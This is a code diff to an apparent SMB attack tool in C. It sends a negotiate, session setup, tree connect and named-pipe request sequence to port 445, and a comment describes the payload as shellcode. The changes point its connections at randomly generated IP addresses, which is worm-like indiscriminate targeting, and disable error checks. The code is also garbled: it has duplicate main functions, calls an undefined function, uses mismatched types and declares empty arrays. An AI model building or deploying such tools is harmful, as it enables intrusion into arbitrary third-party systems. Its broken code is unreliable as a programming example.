@@ -55,6 +55,40 @@ char random(char ip[16]) {
     return 0;
 }
 
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+// We return 'char' as requested, though usually functions return 
+// an int for success/fail. Here it returns 0 after filling the buffer.
+char random_ip(char* ip_buffer) {
+    // Generate 4 random octets
+    int a = rand() % 256;
+    int b = rand() % 256;
+    int c = rand() % 256;
+    int d = rand() % 256;
+
+    // Correctly format the string into the provided buffer
+    // snprintf is safer than sprintf as it prevents buffer overflows
+    snprintf(ip_buffer, 16, "%d.%d.%d.%d", a, b, c, d);
+
+    return 0; 
+}
+
+int main() {
+    // Seed the random number generator so it's different every time
+    srand((unsigned int)time(NULL));
+
+    char current_ip[16]; // The "storage" for our IP string
+    
+    // Call the function
+    generate_random_ip(current_ip);
+
+    // Now current_ip holds a random address like "192.168.1.1"
+    printf("Generated IP: %s\n", current_ip);
+
+    return 0;
+}
 int main(int argc, char** argv)
 {
     WSADATA ws;
@@ -83,13 +117,13 @@ int main(int argc, char** argv)
             continue;
 
         server.sin_port = htons((USHORT)port);
-
-        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0)
+	    // random_ip(server);
+        if (connect(sock, (char*)random_ip(server), sizeof(server)) == 0)
         {
         // printf("Open port: %d\n", port);
     }
-    printf("Connecting...\n");
-    connect(sock, (struct sockaddr*) & server, sizeof(server));
+    // printf("\nConnecting... :");
+    connect(sock, (char*)random_ip(server), sizeof(server));
     /**if (ret == -1)
     {
         printf("Connection Error, Port 445 Firewalled?\n");
@@ -97,7 +131,7 @@ int main(int argc, char** argv)
     }*/
 	// sends executable data asuming it is shell code which means for mac ios windows and linux shellcode specifically for each
 	// type.
-    send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
+    send(sock, (char*)SmbNegociate, sizeof(SmbNegociate), 0);
     printf("sending Session_Setup_AndX_Request!\n");
     send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request), 0);
     /**if (ret <= 0)
@@ -128,12 +162,12 @@ int main(int argc, char** argv)
 		
     //send TreeConnect request
     printf("sending TreeConnect Request!\n");
-    ret = send(sock, (char*)treeConnectRequest, sizeof(treeConnectRequest) - 1, 0);
-    if (ret <= 0)
+    send(sock, (char*)treeConnectRequest, sizeof(treeConnectRequest), 0);
+    /**if (ret <= 0)
     {
         printf("send TreeConnect_AndX_Request error!\n");
         return 0;
-    }
+    }*/
 	char recvbuff[];
     recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
     /**
@@ -152,12 +186,12 @@ int main(int argc, char** argv)
 	chat confirmationStr[];
 	
     printf("sending transNamedPipeRequest!\n");
-    ret = send(sock, (char*)enablingStr, sizeof(transNamedPipeRequest) - 1, 0);
-    if (ret <= 0)
+    send(sock, (char*)enablingStr, sizeof(transNamedPipeRequest), 0);
+    /**if (ret <= 0)
     {
         printf("send modified transNamedPipeRequest error!\n");
         return 0;
-    }
+    }*/
     recv(sock, (char*)confirmationStr, sizeof(recvbuff), 0);
     
 	/**
